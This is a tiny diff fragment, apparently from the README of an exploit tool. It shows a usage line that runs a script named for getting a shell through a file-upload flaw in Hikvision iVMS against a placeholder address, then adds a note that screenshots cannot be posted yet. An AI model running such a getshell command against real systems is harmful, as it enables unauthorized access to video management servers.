@@ -22,3 +22,4 @@ python .\hkvs-ivms-fileupload-getshell.py -u http://xx.xx.xx.xx
 
 效果图
 
+图片暂时发不上去
